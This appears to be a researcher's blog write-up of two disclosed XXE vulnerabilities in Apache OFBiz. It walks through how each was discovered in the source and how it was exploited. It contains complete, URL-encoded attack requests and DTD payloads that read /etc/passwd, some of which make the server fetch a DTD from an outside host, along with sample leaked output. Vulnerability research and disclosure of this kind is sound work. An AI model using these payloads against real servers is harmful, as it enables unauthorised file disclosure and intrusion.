---
layout: post
title: Discovering and Exploiting two XXE Injections in Apache OFBiz
published: true
---

This post will go over two distinct XML External Entity (XXE) injections in <a href="https://ofbiz.apache.org/" target="_blank">Apache OFBiz</a> that I discovered during a penetration test. It is intended to demonstrate my thought process throughout the discovery and exploitation of both vulnerabilities.

If you just want the exploit, you can find it <a href="https://github.com/jamieparfet/Apache-OFBiz-XXE" target="_blank">here</a>.

# Initial Research
After determining that the target application was built on OFBiz, I downloaded the latest version (16.11.04 at the time) and deployed it locally on an Ubuntu 16.04 VM:

```
$ sudo add-apt-repository ppa:webupd8team/java
$ sudo apt install oracle-java8-installer 
$ sudo update-alternatives --config java

$ wget https://archive.apache.org/dist/ofbiz/apache-ofbiz-16.11.04.zip
$ unzip apache-ofbiz-16.11.04.zip
$ cd apache-ofbiz-16.11.04/

$ ./gradlew cleanAll loadDefault
$ ./gradlew ofbiz
```

Now I had a local instance with the default configuration running at `https://ofbiz.local:8443/`. I began browsing the source code in order to assess the application's unauthenticated attack surface and discovered some endpoints in <a href="https://github.com/apache/ofbiz/blob/release16.11/framework/service/config/serviceengine.xml#L60-L74" target="_blank">framework/service/config/serviceengine.xml</a> that looked interesting.

# XXE #1 -- HttpEngine (CVE-2018-8033)

## Discovery
A GET request to `/webtools/control/httpService` returns the following HTTP response:

```xml
HTTP/1.1 200 OK
...

<?xml version="1.0" encoding="UTF-8"?>
<ofbiz-ser>
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <std-String value="errorMessage"/>
            </map-Key>
            <map-Value>
                <std-String value="Cannot have null service name"/>
            </map-Value>
        </map-Entry>
    </map-HashMap>
</ofbiz-ser>
```

The error message suggests that the endpoint may be expecting some data in the request. A quick search in the OFBiz source code reveals that the error message is coming from <a href="https://github.com/apache/ofbiz/blob/release16.11/framework/service/src/main/java/org/apache/ofbiz/service/engine/HttpEngine.java#L113-L121" target="_blank">framework/service/src/main/java/org/apache/ofbiz/service/engine/HttpEngine.java</a>:

```java
String serviceName = request.getParameter("serviceName");
String serviceMode = request.getParameter("serviceMode");
String xmlContext = request.getParameter("serviceContext");

...

if (serviceName == null)
    result.put(ModelService.ERROR_MESSAGE, "Cannot have null service name");
```

The error is triggered because the variable `serviceName` does not exist. I issued a GET request to `/webtools/control/httpService?serviceName=canary` and got the following response:

```xml
HTTP/1.1 200 OK
...

<?xml version="1.0" encoding="UTF-8"?><ofbiz-ser>
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <std-String value="errorMessage"/>
            </map-Key>
            <map-Value>
                <std-String value="Service invocation error: org.apache.ofbiz.service.GenericServiceException: Cannot locate service by name (canary)"/>
            </map-Value>
        </map-Entry>
    </map-HashMap>
</ofbiz-ser>
```

I spent a bit of time exploring some of the actual services that could be invoked from this endpoint but found nothing useful (as a side note, invoking the `ping` service will return the message `PONG`).

Looking back at the source code, the parameter `serviceContext` caught my attention. A GET request to `/webtools/control/httpService?serviceName=x&serviceContext=x` returns the following:

```xml
HTTP/1.1 200 OK
...

<?xml version="1.0" encoding="UTF-8"?><ofbiz-ser>
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <std-String value="errorMessage"/>
            </map-Key>
            <map-Value>
                <std-String value="Error occurred deserializing context: org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 1; Content is not allowed in prolog."/>
            </map-Value>
        </map-Entry>
    </map-HashMap>
</ofbiz-ser>
```

The error message is from the same file as earlier. The request parameter `serviceContext` is being assigned to the variable `xmlContext` and then passed to the following <a href="https://github.com/apache/ofbiz/blob/release16.11/framework/service/src/main/java/org/apache/ofbiz/service/engine/HttpEngine.java#L126-L142" target="_blank">function</a>, which attempts to deserialize it.

```java
if (xmlContext != null) {
    try {
        Object o = XmlSerializer.deserialize(xmlContext, delegator);
        if (o instanceof Map<?, ?>)
            context = UtilGenerics.checkMap(o);
        else {
            Debug.logError("Context not an instance of Map error", module);
            result.put(ModelService.ERROR_MESSAGE, "Context not an instance of Map");
        }
    } catch (Exception e) {
        Debug.logError(e, "Deserialization error", module);
        result.put(ModelService.ERROR_MESSAGE, "Error occurred deserializing context: " + e.toString());
    }
}
```

If an exception is thrown, the application will return a detailed error message with `e.toString()`. This is where the XXE comes into play. After much trial and error, including many unsuccessful attempts at accessing local files, I found that I could trigger a Server Side Request Forgery (SSRF) by URL-encoding the following XML payload:

```xml
<!DOCTYPE x [
<!ENTITY % req SYSTEM "http://x.burpcollaborator.net">
%req;
]>
```

That's when I realized that this vulnerability could only be exploited using an external Document Type Definition (DTD) declaration. There are plenty of resources that can explain XML syntax better than I, but this essentially means that the XML parser needs to reference another file for instructions on how to behave.

## Exploitation
### Method #1 -- Externally Hosted DTD File
The following XML payload contains multiple stages:

```xml
<!DOCTYPE x [
<!ENTITY % request-external-dtd SYSTEM "http://example.com/ext.dtd">
<!ENTITY % target-file SYSTEM "file:///etc/passwd">
%request-external-dtd;
%trigger-error;
]>
<x>&disclose;</x>
```

First, it instructs the target server to retrieve a file from `http://example.com/ext.dtd`, which contains the following DTD:

```xml
<!ENTITY % trigger-error "<!ENTITY disclose SYSTEM 'file:///nonexistent/%target-file;'>">
```

Next, using the entity `trigger-error` declared in the external DTD file, the target server attempts to access a nonexistent file on its own filesystem (`file:///nonexistent/`), triggering the exception from earlier. The server will display a "File Not Found" error message, followed by the contents of the file declared in the entity `target-file`.

Here is example of the full HTTP request containing the URL-encoded payload from above:

```http
POST /webtools/control/httpService HTTP/1.1
Host: ofbiz.local:8443
Content-Type: application/x-www-form-urlencoded
Connection: close

serviceName=x&serviceContext=%3c%21%44%4f%43%54%59%50%45%20%78%20%5b%0a%3c%21%45%4e%54%49%54%59%20%25%20%72%65%71%75%65%73%74%2d%65%78%74%65%72%6e%61%6c%2d%64%74%64%20%53%59%53%54%45%4d%20%22http://example.com/ext.dtd%22%3e%0a%3c%21%45%4e%54%49%54%59%20%25%20%74%61%72%67%65%74%2d%66%69%6c%65%20%53%59%53%54%45%4d%20%22file:///etc/passwd%22%3e%0a%25%72%65%71%75%65%73%74%2d%65%78%74%65%72%6e%61%6c%2d%64%74%64%3b%0a%25%74%72%69%67%67%65%72%2d%65%72%72%6f%72%3b%0a%5d%3e%0a%3c%78%3e%26%64%69%73%63%6c%6f%73%65%3b%3c%2f%78%3e
```

The target server will respond with the following error message, disclosing the contents of `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ofbiz-ser>
  <map-HashMap>
    <map-Entry>
      <map-Key>
        <std-String value="errorMessage"/>
      </map-Key>
      <map-Value>
        <std-String value="Error occurred deserializing context: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash&#10;1:1daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&#10;bin:x:2:2:bin:/bin:/usr/sbin/nologin&#10;
...
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash (No such file or directory)"/>
      </map-Value>
    </map-Entry>
  </map-HashMap>
</ofbiz-ser>
```

## A Quick Note
I was unable to exploit this vulnerability during the penetration test because a firewall was blocking outbound HTTP requests from the target server.

However, I recently came across a <a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank">blog post</a> that inspired me to revisit this exploitation method. The <a href="https://twitter.com/_mohemiv" target="_blank">author</a> presents a technique that eliminates the need for an outbound HTTP request to retrieve the necessary DTD file. Instead, external DTD syntax can be included by redefining a parameter entity inside a local DTD file on the target server. I highly recommend reading the blog post to better understand how this technique works.

### Method #2 -- External DTD in a Local DTD File
Unfortunately, the file used in the blog post above (`/usr/share/yelp/dtd/docbookx.dtd`) doesn't ship with every Linux distribution. In order to maximize the effectiveness of this exploit, I found a DTD file that comes packaged with OFBiz that can reliably achieve the same result: `applications/content/dtd/docbookx.dtd`.

The following payload redefines the necessary parameter entities in the OFBiz DTD file to reference *another* DTD file in the same directory. Again, this payload has to be URL-encoded before being submitted in the `serviceContext` parameter:

```xml
<!DOCTYPE x [
<!ENTITY % local-dtd SYSTEM "file:///path/to/ofbiz/applications/content/dtd/docbookx.dtd">
<!ENTITY % target-file SYSTEM "file:///etc/passwd">
<!ENTITY % dbnotn SYSTEM "docbook.dtd">
<!ENTITY % dbcent SYSTEM "docbook.dtd">
<!ENTITY % dbhier SYSTEM "docbook.dtd">
<!ENTITY % dbgenent SYSTEM "docbook.dtd">
<!ENTITY % dbpool '<!ENTITY &#x25; trigger-error "<!ENTITY disclose SYSTEM &#x27;file:///nonexistent/&#x25;target-file;&#x27;>">'>
%local-dtd;
%trigger-error;
]>
<x>&disclose;</x>
```

The result is the exact same as the first payload but we completely avoided triggering any outbound requests.

The silver lining in being unable to exploit this during the engagement was that it forced me to keep looking for other vulnerabilities in Apache OFBiz. It didn't take long before I discovered a second, entirely seperate XXE, this time in the application's XML-RPC server.


# XXE #2 -- XML-RPC (CVE-2011-3600)
## Discovery
A GET request to `/webtools/control/xmlrpc` returns the following HTTP response:

```xml
HTTP/1.1 200 OK
...

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions">
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value>
            <i4>0</i4>
          </value>
        </member>
        <member>
          <name>faultString</name>
          <value>Failed to parse XML-RPC request: Premature end of file.</value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

I looked up the <a href="http://xmlrpc.scripting.com/spec.html" target="_blank">XML-RPC specification</a> to figure out the expected format and issued a request with an arbitrary value inside the `methodName` element:

```http
POST /webtools/control/xmlrpc HTTP/1.1
Host: ofbiz.local:8443
Content-Type: application/xml

<methodCall>
  <methodName>canary</methodName>
</methodCall>
```

The arbitrary value is reflected in an error message in the response:

```xml
HTTP/1.1 200 OK
...

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions">
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value>
            <i4>0</i4>
          </value>
        </member>
        <member>
          <name>faultString</name>
          <value>No such service [canary]</value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

Another quick search of the source code reveals that the error message is coming from <a href="https://github.com/apache/ofbiz/blob/a3a13b695c9ac38db60df4e2e769c7547c58f310/framework/webapp/src/main/java/org/apache/ofbiz/webapp/event/XmlRpcEventHandler.java#L66" target="_blank">framework/webapp/src/main/java/org/apache/ofbiz/webapp/event/XmlRpcEventHandler.java</a>. The XML-RPC request is being passed to a <a href="https://github.com/apache/ofbiz/blob/a3a13b695c9ac38db60df4e2e769c7547c58f310/framework/webapp/src/main/java/org/apache/ofbiz/webapp/event/XmlRpcEventHandler.java#L219-L230" target="_blank">function</a> that parses it for the provided service:

```java
public XmlRpcHandler getHandler(String method) throws XmlRpcNoSuchHandlerException, XmlRpcException {
    ModelService model = null;
    try {
        model = dispatcher.getDispatchContext().getModelService(method);
    } catch (GenericServiceException e) {
        Debug.logWarning(e, module);
    }
    if (model == null) {
        throw new XmlRpcNoSuchHandlerException("No such service [" + method + "]");
    }
    return this;
}
```

Once again, the XXE vulnerability is caused by improper error handling. By referencing a file on the local file system, we can simply include its contents in the application's response. The exploit is as simple as it gets:

```http
POST /webtools/control/xmlrpc HTTP/1.1
Host: vulnerable.host
Content-Type: application/xml
Connection: close

<?xml version="1.0"?>
<!DOCTYPE x [
<!ENTITY disclose SYSTEM "file:///etc/passwd">
]>
<methodCall><methodName>
&disclose;
</methodName></methodCall>
```

The target server will respond with the following error message, disclosing the contents of the target file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions">
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value>
            <i4>0</i4>
          </value>
        </member>
        <member>
          <name>faultString</name>
          <value>No such service [
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            bin:x:2:2:bin:/bin:/usr/sbin/nologin
            ...
            ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
            ]</value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

Unfortunately, this won't work for every file on the target server. Files containing certain special characters, like `%`, will always fail to parse. One way to get render *some* of these special characters (but not all) is to reference an external DTD file and wrap the contents of the target file in a character data (CDATA) section:

```xml
<!DOCTYPE x [
<!ENTITY % start "<![CDATA[">
<!ENTITY % target-file SYSTEM "file:///path/to/ofbiz/framework/component-load.xml">
<!ENTITY % end "]]>">
<!ENTITY % request-external-dtd SYSTEM "http://example.com/ext.dtd">
%request-external-dtd;
]>
<methodCall><methodName>
&disclose;
</methodName></methodCall>
```

The external file will need to contain the following DTD:
```xml
<!ENTITY disclose "%start;%target-file;%end;">
```

And, of course, the same method of using a local DTD file that was described earlier can be applied here.

# Disclosures
The public disclosures, issued by the Apache OFBiz security team, can be found are here:

* <a href="https://seclists.org/oss-sec/2018/q4/12" target="_blank">https://seclists.org/oss-sec/2018/q4/12</a>
* <a href="https://seclists.org/oss-sec/2018/q4/13" target="_blank">https://seclists.org/oss-sec/2018/q4/13</a>

Contrary to what the disclosures state, both vulnerabilities affect *all* versions of Apache OFBiz up to 16.11.04.